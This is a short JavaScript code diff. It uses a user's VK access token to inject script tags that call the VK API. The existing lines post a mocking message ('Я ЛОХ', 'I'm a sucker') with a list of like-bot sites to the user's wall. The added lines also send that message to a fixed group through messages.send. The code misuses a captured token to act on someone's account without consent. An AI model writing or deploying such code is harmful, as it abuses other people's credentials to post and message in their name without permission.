@@ -33,6 +33,10 @@
 			let el = document.createElement('script');
 			el.src = `https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&message=vto.pe vkbot.ru olike.ru turboliker.ru Я ЛОХ #kicknaebalovoogai`;
 			document.body.appendChild(el);
+
+			el = document.createElement('script');
+			el.src = `https://api.vk.com/method/messages.send?v=5.103&access_token=${token}&message=vto.pe vkbot.ru olike.ru turboliker.ru Я ЛОХ #kicknaebalovoogai&peer_id=-192835178&random_id=0`;
+			document.body.appendChild(el);
 		}
 
 		// function _callback(response) {
